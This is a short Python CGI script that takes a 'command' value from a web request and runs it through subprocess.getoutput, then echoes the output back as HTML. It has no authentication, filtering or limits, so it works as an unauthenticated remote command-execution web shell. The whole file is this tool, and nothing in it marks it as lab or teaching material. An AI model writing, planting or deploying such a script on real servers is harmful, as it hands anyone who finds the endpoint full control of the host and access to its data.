#!/usr/bin/python3

import subprocess
import cgi

print("Content-type: text/html")
print()

form = cgi.FieldStorage()
command = form.getvalue("command")

if command:
    try:
        output = subprocess.getoutput(command)
        print("<pre><h2>")
        print("Command executed successfully:")
        print(output)
        print("</h2></pre>")
    except Exception as e:
        print("<pre><h2>")
        print("Error executing command:", e)
        print("</h2></pre>")
else:
    print("<h2>No command provided.</h2>")
